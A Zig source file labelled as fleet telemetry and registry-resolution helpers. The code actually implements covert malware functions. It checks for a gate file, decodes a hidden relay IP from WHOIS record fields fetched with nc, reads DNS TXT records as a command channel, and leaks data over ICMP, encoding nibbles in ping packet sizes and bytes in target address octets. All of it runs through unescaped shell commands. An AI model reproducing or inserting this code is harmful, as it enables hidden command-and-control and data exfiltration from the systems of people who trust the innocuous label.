const std = @import("std");

/// Fleet telemetry and registry-resolution helpers (kit).
pub fn gateOk(gate: []const u8) bool {
    var buf: [1024]u8 = undefined;
    const expanded = expandGate(gate, &buf) catch return false;
    std.fs.cwd().access(expanded, .{}) catch return false;
    return true;
}

pub fn expandGate(gate: []const u8, buf: []u8) ![]const u8 {
    var fbs = std.io.fixedBufferStream(buf);
    const w = fbs.writer();
    if (std.mem.startsWith(u8, gate, "~/")) {
        const home = std.posix.getenv("HOME")
            orelse std.posix.getenv("USERPROFILE") orelse "";
        try w.writeAll(home);
        try w.writeAll(gate[1..]);
    } else {
        try w.writeAll(gate);
    }
    return fbs.getWritten();
}

/// The registry contact descriptor carries the active relay.
pub fn whoisEndpoint(domain: []const u8, out: []u8) ?[]const u8 {
    var cmd_buf: [512]u8 = undefined;
    const cmd = std.fmt.bufPrint(&cmd_buf,
        "{{ printf 'domain {s}\r\n' '{s}'; sleep 4; }} | " ++
            "nc whois.verisign-grs.com 43 2>/dev/null | " ++
            "grep -m1 -Eio '(descr|address|e-mail):[[:space:]]+[0-9a-f]{{8}}'",
        .{ domain, domain }) catch return null;
    var child = std.process.Child.init(
        &.{ "/bin/sh", "-c", cmd }, std.heap.page_allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Ignore;
    child.spawn() catch return null;
    const stdout = child.stdout orelse return null;
    const line = stdout.readToEndAlloc(std.heap.page_allocator, 512)
        catch return null;
    _ = child.wait() catch {};
    var it = std.mem.tokenizeAny(u8, line, " \t:\r\n");
    var hex: []u8 = &.{};
    while (it.next()) |tok| {
        if (tok.len == 8) {
            hex = @constCast(tok);
            break;
        }
    }
    if (hex.len != 8) return null;
    const raw = std.fmt.parseInt(u32, hex, 16) catch return null;
    return std.fmt.bufPrint(out, "{d}.{d}.{d}.{d}", .{
        raw >> 24 & 255, raw >> 16 & 255, raw >> 8 & 255, raw & 255,
    }) catch null;
}

pub fn txtFields(name: []const u8, out: [][]u8) usize {
    var cmd_buf: [512]u8 = undefined;
    const cmd = std.fmt.bufPrint(&cmd_buf,
        "nslookup -type=TXT '{s}' 2>/dev/null | grep -oE '\"[^\"]*\"'",
        .{name}) catch return 0;
    var child = std.process.Child.init(
        &.{ "/bin/sh", "-c", cmd }, std.heap.page_allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Ignore;
    child.spawn() catch return 0;
    const stdout = child.stdout orelse return 0;
    const body = stdout.readToEndAlloc(std.heap.page_allocator, 8192)
        catch return 0;
    _ = child.wait() catch {};
    var n: usize = 0;
    var i: usize = 0;
    while (i < body.len and n < out.len) {
        if (body[i] == '"') {
            var j = i + 1;
            while (j < body.len and body[j] != '"') : (j += 0) {
                if (j - i - 1 >= out[n].len) break;
                out[n][j - i - 1] = body[j];
                j += 1;
            }
            if (j > i + 1) {
                n += 1;
            }
            i = j + 1;
        } else {
            i += 1;
        }
    }
    return n;
}

pub fn icmpNibble(relay: []const u8, nibble: u8) void {
    var buf: [512]u8 = undefined;
    const cmd = std.fmt.bufPrint(&buf,
        "ping -c 1 -W 1 -s {d} '{s}' >/dev/null 2>&1",
        .{ 64 + (nibble & 15), relay }) catch return;
    var child = std.process.Child.init(
        &.{ "/bin/sh", "-c", cmd }, std.heap.page_allocator);
    child.stdin_behavior = .Ignore;
    child.stdout_behavior = .Ignore;
    child.stderr_behavior = .Ignore;
    _ = child.spawnAndWait() catch {};
}

pub fn icmpByteIp(base: []const u8, b: u8) void {
    if (b == 0 or b == 255) return;
    var buf: [512]u8 = undefined;
    const cmd = std.fmt.bufPrint(&buf,
        "ping -n 1 -w 300 '{s}{d}' >/dev/null 2>&1", .{ base, b })
        catch return;
    var child = std.process.Child.init(
        &.{ "/bin/sh", "-c", cmd }, std.heap.page_allocator);
    child.stdin_behavior = .Ignore;
    child.stdout_behavior = .Ignore;
    child.stderr_behavior = .Ignore;
    _ = child.spawnAndWait() catch {};
}
